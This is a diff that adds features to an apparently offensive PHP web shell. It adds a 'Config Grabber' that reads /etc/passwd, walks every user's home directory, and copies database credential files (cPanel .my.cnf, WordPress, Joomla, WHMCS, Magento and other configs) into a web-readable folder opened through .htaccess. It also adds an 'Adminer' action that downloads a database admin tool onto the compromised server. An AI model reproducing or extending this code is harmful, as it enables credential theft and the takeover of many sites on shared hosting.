@@ -274,6 +274,229 @@ class XN {
             }
         } return $output;
     }
+    public static function adminer($url, $data) {
+    	$handle = fopen($data, "w");
+    	$ch = curl_init();
+    	curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		curl_setopt($ch, CURLOPT_FILE, $handle);
+		return curl_exec($ch);
+		curl_close($ch);
+		fclose($handle);
+		ob_flush();
+		flush();
+    }
+    public static function config($passwd) {
+    	mkdir('.config', 0777);
+		$htaccess = 'Options allnRequire NonenSatisfy Any';
+		$handle = fopen('.config/.htaccess', "w");
+		fwrite($handle, $htaccess);
+		preg_match_all('/(.*?):x:/', $passwd, $matches);
+		foreach ($matches[1] as $user) {
+			$user_config = '/home/$user/public_html/';
+			if (is_readable($user_config)) {
+				$grab_config = array(
+					"/home/$user/.my.cnf" => "cpanel",
+					"/home/$user/public_html/config/koneksi.php" => "Lokomedia",
+					"/home/$user/public_html/forum/config.php" => "phpBB",
+					"/home/$user/public_html/sites/default/settings.php" => "Drupal",
+					"/home/$user/public_html/config/settings.inc.php" => "PrestaShop",
+					"/home/$user/public_html/app/etc/local.xml" => "Magento",
+					"/home/$user/public_html/admin/config.php" => "OpenCart",
+					"/home/$user/public_html/application/config/database.php" => "Ellislab",
+					"/home/$user/public_html/vb/includes/config.php" => "Vbulletin",
+					"/home/$user/public_html/includes/config.php" => "Vbulletin",
+					"/home/$user/public_html/forum/includes/config.php" => "Vbulletin",
+					"/home/$user/public_html/forums/includes/config.php" => "Vbulletin",
+					"/home/$user/public_html/cc/includes/config.php" => "Vbulletin",
+					"/home/$user/public_html/inc/config.php" => "MyBB",
+					"/home/$user/public_html/includes/configure.php" => "OsCommerce",
+					"/home/$user/public_html/shop/includes/configure.php" => "OsCommerce",
+					"/home/$user/public_html/os/includes/configure.php" => "OsCommerce",
+					"/home/$user/public_html/oscom/includes/configure.php" => "OsCommerce",
+					"/home/$user/public_html/products/includes/configure.php" => "OsCommerce",
+					"/home/$user/public_html/cart/includes/configure.php" => "OsCommerce",
+					"/home/$user/public_html/inc/conf_global.php" => "IPB",
+					"/home/$user/public_html/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/wp/test/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/blog/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/beta/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/portal/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/site/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/wp/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/WP/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/news/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/wordpress/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/test/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/demo/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/home/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/v1/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/v2/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/press/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/new/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/blogs/wp-config.php" => "Wordpress",
+					"/home/$user/public_html/configuration.php" => "Joomla",
+					"/home/$user/public_html/blog/configuration.php" => "Joomla",
+					"/home/$user/public_html/submitticket.php" => "^WHMCS",
+					"/home/$user/public_html/cms/configuration.php" => "Joomla",
+					"/home/$user/public_html/beta/configuration.php" => "Joomla",
+					"/home/$user/public_html/portal/configuration.php" => "Joomla",
+					"/home/$user/public_html/site/configuration.php" => "Joomla",
+					"/home/$user/public_html/main/configuration.php" => "Joomla",
+					"/home/$user/public_html/home/configuration.php" => "Joomla",
+					"/home/$user/public_html/demo/configuration.php" => "Joomla",
+					"/home/$user/public_html/test/configuration.php" => "Joomla",
+					"/home/$user/public_html/v1/configuration.php" => "Joomla",
+					"/home/$user/public_html/v2/configuration.php" => "Joomla",
+					"/home/$user/public_html/joomla/configuration.php" => "Joomla",
+					"/home/$user/public_html/new/configuration.php" => "Joomla",
+					"/home/$user/public_html/WHMCS/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/whmcs1/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Whmcs/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/whmcs/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/whmcs/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/WHMC/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Whmc/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/whmc/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/WHM/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Whm/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/whm/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/HOST/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Host/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/host/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/SUPPORTES/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Supportes/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/supportes/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/domains/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/domain/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Hosting/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/HOSTING/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/hosting/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/CART/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Cart/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/cart/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/ORDER/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Order/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/order/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/CLIENT/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Client/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/client/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Clientarea/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/clientarea/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/SUPPORT/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Support/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/support/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/BILLING/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Billing/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/billing/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/BUY/sumitticket.php" => "WHMCS",
+					"/home/$user/public_html/Buy/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/buy/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/MANAGE/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Manage/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/manage/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/ClientSupport/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Clientsupport/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/clientsupport/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/CHECKOUT/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Checkout/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/checkout/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Billings/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/billings/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/BASKET/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Basket/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/basket/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/SECURE/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Secure/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/secure/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/SALES/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Sales/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/sales/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/BILL/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Bill/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/bill/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/PURCHASE/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Purchase/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/purchase/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/ACCOUNT/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Account/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/account/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/USER/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/User/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/user/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/CLIENTS/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Clients/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/clients/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/Billings/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/billings/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/MY/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/My/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/my/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/secure/whm/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/secure/whmcs/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/panel/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/clientes/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/cliente/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/support/order/submitticket.php" => "WHMCS",
+					"/home/$user/public_html/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/boxbilling/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/box/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/host/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/Host/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/supportes/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/support/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/hosting/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/cart/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/order/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/client/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/clients/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/cliente/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/clientes/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/billing/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/billings/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/my/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/secure/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/support/order/bb-config.php" => "BoxBilling",
+					"/home/$user/public_html/includes/dist-configure.php" => "Zencart",
+					"/home/$user/public_html/zencart/includes/dist-configure.php" => "Zencart",
+					"/home/$user/public_html/products/includes/dist-configure.php" => "Zencart",
+					"/home/$user/public_html/cart/includes/dist-configure.php" => "Zencart",
+					"/home/$user/public_html/shop/includes/dist-configure.php" => "Zencart",
+					"/home/$user/public_html/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/hostbills/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/host/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/Host/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/supportes/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/support/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/hosting/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/cart/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/order/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/client/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/clients/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/cliente/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/clientes/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/billing/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/billings/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/my/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/secure/includes/iso4217.php" => "Hostbills",
+					"/home/$user/public_html/support/order/includes/iso4217.php" => "Hostbills");
+			}
+			foreach ($grab_config as $config => $config_name) {
+				$get_config = file_get_contents($config);
+				if ($get_config == '') {
+				} else {
+					$file_config = fopen(".config/".$user."-".$config_name.".txt", 'w');
+					fputs($file_config, $get_config);
+				}
+			}
+		}
+	}
     public static function rewrite($dir, $extension, $text) {
         if (is_writable($dir)) {
             foreach (self::listFile($dir) as $key => $value) {
@@ -376,6 +599,16 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
+                    <button name="action" value="adminer">
+                        <div class="icon">
+                            <a><i class="fa fa-upload" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Adminer
+                        </div>
+                    </button>
+                </li>
+                <li>
                     <button name="action" value="upload">
                         <div class="icon">
                             <a><i class="fa fa-upload" aria-hidden="true"></i></a>
@@ -406,9 +639,7 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button type="button" onclick="$(document).ready(function () {  
-                        jqxAlert.alert('maintenance');  
-                    })">
+                    <button name="action" value="config">
                         <div class="icon">
                             <a><i class="fa fa-cog" aria-hidden="true"></i></a>
                         </div>
@@ -614,6 +845,12 @@ function alert($message) {
         height:555px;
         overflow: auto;
     }
+    .adminer {
+    	padding-left: 25px;
+        padding-right: 25px;
+        display: block;
+    }
+    .config,
     .rewrite,
     .addfile,
     .adddir,
@@ -623,6 +860,7 @@ function alert($message) {
         padding-left: 25px;
         padding-right: 25px;
     }
+    .config table td,
     .rewrite table td,
     .addfile table td,
     .adddir table td,
@@ -644,6 +882,7 @@ function alert($message) {
         padding-left:10px;
         padding-right: 10px;
     }
+    .config input[type=submit],
     .rewrite input[type=submit],
     .addfile input[type=submit],
     .adddir input[type=submit],
@@ -1183,8 +1422,57 @@ function filterTable() {
                 alert("Permission Danied");
             }
             break;
+        case 'adminer':
+        	head('Adminer', getcwd(), 'hidden');
+        	if (file_exists('adminer.php')) {
+        		?> <a href="adminer.php" target="_blank">Login Adminer</a> <?php
+        	} else {
+        		if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php', 'adminer.php')) {
+        			?>
+        			<div class="adminer">
+        				<span>
+        					Successfully created Adminer.php
+        				</span>
+        				<a href="adminer.php" target="_blank">Login Adminer</a>
+        			</div>
+        			<?php
+        		}
+        	}
+        	exit();
+        	break;
+        case 'config':
+        	head('Config Grabber', getcwd(), 'hidden');
+        	?>
+        	<div class="config">
+        		<table>
+        			<form method="post">
+        				<tr>
+        					<td>
+        						<textarea name="passwd"><?= include('/etc/passwd') ?></textarea>
+        					</td>
+        				</tr>
+        				<tr>
+        					<td>
+        						<input type="submit" name="grab" value="Grab">
+        						<input type="hidden" name="action" value="config">
+        					</td>
+        				</tr>
+        			</form>
+        		</table>
+        	</div>
+        	<?php
+        	if (XN::OS() == 'Windows') die(alert('Just for Linux server'));
+        	if (isset($_POST['grab'])) {
+        		if (XN::config($_POST['passwd'])) {
+        			alert("failed");
+        		} else {
+        			alert("success");
+        		}
+        	}
+        	exit();
+        	break;
         case 'rewrite':
-        head('Rewrite All Dir', getcwd(), 'hidden');
+        	head('Rewrite All Dir', getcwd(), 'hidden');
             ?>
             <div class="rewrite">
                 <table>
